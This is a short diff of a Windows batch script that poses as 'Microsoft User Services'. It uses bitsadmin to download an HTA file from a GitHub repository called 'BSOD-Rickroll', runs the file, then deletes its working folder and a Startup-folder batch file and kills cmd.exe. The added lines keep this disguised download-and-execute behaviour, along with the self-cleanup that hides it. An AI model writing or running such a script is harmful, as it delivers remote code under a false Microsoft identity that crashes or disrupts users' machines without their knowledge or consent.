@@ -2,10 +2,10 @@
 
 cls
 title Microsoft User Services
-mkdir "%AppData%\Microsoft\Update\User\Services"
+mkdir "%AppData%\Microsoft\Update"
 
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Instant/Instant_msrkl.hta" "%AppData%\Microsoft\Update\msrkl.hta"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Instant/Instant_msrkl.hta" "msrkl.hta"
 echo "download completed"
-start "%AppData%\Microsoft\Update\msrkl.hta"
+start msrkl.hta
 echo "file opened successfully"
 start rmdir /s /q "%appdata%\Microsoft\Update" || exit /b 0 && del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Instant_startup.bat"  || exit /b 0 && taskkill /f /im cmd.exe
